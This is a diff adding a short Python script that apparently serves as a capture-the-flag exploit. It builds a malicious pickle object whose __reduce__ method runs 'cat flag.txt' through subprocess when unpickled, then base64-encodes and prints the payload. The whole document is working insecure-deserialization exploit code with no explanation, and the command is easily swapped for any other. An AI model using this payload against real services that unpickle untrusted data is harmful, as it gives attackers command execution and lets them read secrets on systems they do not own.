@@ -1,0 +1,23 @@
+script : 
+
+import pickle
+
+import base64
+
+import subprocess
+
+class MaliciousLS:
+
+	def __reduce__(self):
+
+		cmd = ['cat', 'flag.txt']
+
+
+
+		return (subprocess.check_output, (cmd,))
+
+pickled = pickle.dumps(MaliciousLS())
+
+encoded = base64.b64encode(pickled).decode()
+
+print(encoded)
